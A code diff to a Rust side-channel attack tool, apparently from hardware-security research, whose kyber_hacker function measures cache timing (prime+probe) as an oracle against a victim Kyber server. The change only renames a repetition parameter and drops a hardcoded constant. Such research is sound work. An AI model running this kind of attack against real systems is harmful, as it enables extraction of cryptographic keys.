@@ -108,7 +108,7 @@ fn kyber_hacker(
     victim_cl_start: u64,
     victim_cl_end: u64,
     victim_buf_offset: u64,
-    poll_times: usize,
+    ct_repetitions: usize,
     timer: &MyTimer,
     mut bench_time_file: &File
 ) {
@@ -511,7 +511,6 @@ fn kyber_hacker(
 
     // instead of creating a ciphertext here, we rely on a smart process that will submit us
     // with them, we just need to measure the timing, i.e. we are implementing an oracle here
-    let oracle_repetitions: usize = 3;
     let mut ct_idx: usize = 0;
     let mut total_calls: usize = 0;
     let mut total_skipped_calls: usize = 0;
@@ -541,7 +540,7 @@ fn kyber_hacker(
         ct_idx += 1;
 
         let mut times_to_load_test_ptr_atk = vec![];
-        for _ in 0..oracle_repetitions {
+        for _ in 0..ct_repetitions {
             msg_data[0] = !(__trash & MSB_MASK) as u8;
             stream.write_all(&msg_data).unwrap();
 
@@ -589,7 +588,7 @@ fn kyber_hacker(
             stream.write_all(&ct_rand).unwrap();
             stream.read_exact(&mut msg_data).unwrap();
         }
-        total_calls += oracle_repetitions;
+        total_calls += ct_repetitions;
 
         let (p0, skipped) = posterior_p0(&times_to_load_test_ptr_atk);
         total_skipped_calls += skipped;
@@ -607,12 +606,12 @@ fn main() {
     let repetitions = args().nth(1).expect("Enter <repetitions>");
     let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
     let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");
-    let poll_times = args().nth(4).expect("Enter <number of trials to do poll>");
+    let ct_repetitions = args().nth(4).expect("Enter <number of repetitions for each ciphertext>");
     let repetitions = repetitions.parse::<usize>().unwrap();
     let pp_threshold = pp_threshold.parse::<u64>().unwrap();
     let num_group = num_group.parse::<usize>().unwrap();
     assert_eq!(NUM_EVSETS % num_group, 0);
-    let poll_times = poll_times.parse::<usize>().unwrap();
+    let ct_repetitions = ct_repetitions.parse::<usize>().unwrap();
 
     // load victim array page offset
     let victim_buf_offset_str: Vec<String> = read_to_string("kyber_addr.txt").unwrap().lines().map(String::from).collect();
@@ -636,7 +635,7 @@ fn main() {
     assert!((victim_buf_offset as usize + KYBER_SYMBYTES as usize) < NATIVE_PAGE_SIZE);
     println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
     println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);
-    println!("[+] Number of trial for each coefficient -> {}", poll_times);
+    println!("[+] Number of repetitions for each coefficient -> {}", ct_repetitions);
 
     let first_pointer_offset = (victim_buf_offset as usize) & 0x3f80;
     for pointer_idx in 1..4 {
@@ -688,7 +687,7 @@ fn main() {
             println!("Successfully connected to server in port 3333");
             kyber_hacker(stream, oracle_stream, &mut victim_array_cache_lines, repetitions, 
                 pp_threshold, num_group, flush_ptr, victim_cl_start, victim_cl_end, 
-                victim_buf_offset, poll_times, &timer, &bench_time_file);
+                victim_buf_offset, ct_repetitions, &timer, &bench_time_file);
 
         },
         Err(e) => {
